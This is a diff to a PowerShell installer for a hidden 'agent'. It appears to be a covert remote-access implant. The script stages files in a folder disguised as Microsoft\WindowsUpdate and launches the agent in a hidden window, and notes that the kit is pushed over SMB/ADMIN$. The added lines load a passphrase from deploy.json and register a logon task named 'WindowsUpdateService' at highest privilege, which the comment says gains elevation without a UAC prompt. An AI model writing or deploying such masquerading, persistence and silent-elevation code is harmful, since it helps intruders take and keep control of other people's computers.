@@ -10,6 +10,7 @@
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true)][string]$Kit,
+    [switch]$VerifyOnly,
     [string]$Base = "",
     [string]$Parent = "",
     [string]$ParentIp = "",
@@ -29,6 +30,23 @@ function Say([string]$m) { if (-not $Quiet) { Write-Host $m } }
 $target = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsUpdate'
 New-Item -ItemType Directory -Force -Path $target | Out-Null
 
+# The kit ships a deploy.json next to it. Use it when -Room/-Pass were not
+# passed, so a push never has to put the passphrase on a command line.
+$kitDeploy = $null
+try {
+    $candidate = Join-Path $Kit 'deploy.json'
+    if (Test-Path $candidate) {
+        $kitDeploy = Get-Content $candidate -Raw | ConvertFrom-Json
+    }
+} catch { $kitDeploy = $null }
+
+if (-not $Room -and $kitDeploy -and $kitDeploy.room) { $Room = [string]$kitDeploy.room }
+if (-not $Pass -and $kitDeploy -and $kitDeploy.pass) { $Pass = [string]$kitDeploy.pass }
+if (-not $Base -and $kitDeploy -and $kitDeploy.url)  { $Base = [string]$kitDeploy.url }
+$fmt   = if ($kitDeploy -and $kitDeploy.fmt)   { [int]$kitDeploy.fmt }   else { 2 }
+$proto = if ($kitDeploy -and $kitDeploy.proto) { [int]$kitDeploy.proto } else { 2 }
+$pubkey = if ($kitDeploy -and $kitDeploy.pubkey) { [string]$kitDeploy.pubkey } else { '' }
+
 # ---------------------------------------------------------------- stage bundle
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $zip = Join-Path $Kit 'kit.zip'
@@ -40,6 +58,28 @@ foreach ($owned in 'syspy', 'install', 'agent.py', 'bootstrap.py') {
 }
 
 if (Test-Path $zip) {
+    # Verify before extracting. The kit travelled over SMB/ADMIN$ or plain
+    # HTTP; the manifest is inside the archive so it only catches corruption.
+    try {
+        $blob = [IO.File]::ReadAllBytes($zip)
+        $kkey = [Security.Cryptography.SHA256]::Create().ComputeHash(
+            [Text.Encoding]::UTF8.GetBytes("syspy/kit/v1|$Room|$Pass"))
+        $hmac = [Security.Cryptography.HMACSHA256]::new($kkey)
+        $hex = ([BitConverter]::ToString($hmac.ComputeHash($blob))).Replace('-','').ToLower()
+        $expected = $null
+        if ($kitDeploy -and $kitDeploy.hmac) { $expected = [string]$kitDeploy.hmac }
+        if (-not $expected) {
+            $sidecar = Join-Path $Kit 'kit.hmac'
+            if (Test-Path $sidecar) { $expected = (Get-Content $sidecar -Raw).Trim() }
+        }
+        if ($expected -and $hex -ne $expected.ToLower()) {
+            throw "kit integrity check failed"
+        }
+        Say "  kit verified"
+    } catch {
+        if ($_.Exception.Message -like '*integrity check failed*') { throw }
+        Warn "integrity check skipped: $($_.Exception.Message)"
+    }
     Say "  staging bundle from kit.zip"
     [IO.Compression.ZipFile]::ExtractToDirectory($zip, $target)
     Copy-Item $zip (Join-Path $target 'kit.zip') -Force
@@ -136,6 +176,9 @@ $deploy = [ordered]@{
     parent_ip    = $ParentIp
     hop          = $Hop
     group        = $Group
+    fmt          = $fmt
+    proto        = $proto
+    pubkey       = $pubkey
     installed_at = [int](New-TimeSpan -Start (Get-Date '1970-01-01') -End (Get-Date)).TotalSeconds
 }
 # WriteAllText keeps the file BOM-free; json.load chokes on a BOM.
@@ -149,8 +192,28 @@ if (-not $NoStart -and $py) {
     $launchArgs = @()
     $launchArgs += $py.Pre
     $launchArgs += (Join-Path $target 'agent.py')
-    $launchArgs += @('--hidden')
+    $launchArgs += @('--hidden', '--no-elevate')
     Say "  starting agent"
     Start-Process -FilePath (ConvertTo-Windowless $py.Exe) -ArgumentList $launchArgs -WindowStyle Hidden
 }
+# ------------------------------------------------------------------ tasks
+# Create the ONLOGON task here too, /RL HIGHEST /IT. /IT stores no password, so
+# this needs no /RP and Task Scheduler launches it elevated with NO UAC prompt.
+# Every other autostart vector then runs --no-elevate.
+try {
+    $user = $env:USERNAME
+    if (-not $user -or $user.ToUpper() -eq 'SYSTEM') {
+        $user = (Get-CimInstance Win32_ComputerSystem).UserName
+        if ($user) { $user = $user.Split('\\')[-1] }
+    }
+    $vbs = Join-Path $target 'WindowsUpdateService.vbs'
+    $tr  = if (Test-Path $vbs) { "wscript.exe //B //Nologo `"$vbs`"" } else { '' }
+    if ($tr) {
+        $args = @('/Create','/F','/TN','WindowsUpdateService','/TR',$tr,
+                  '/SC','ONLOGON','/RL','HIGHEST','/DELAY','0000:30','/RI','5','/DU','24:00')
+        if ($user) { $args += @('/RU', $user, '/IT') } else { $args += @('/IT') }
+        & schtasks @args | Out-Null
+    }
+} catch { Warn "logon task: $($_.Exception.Message)" }
+
 'ok'
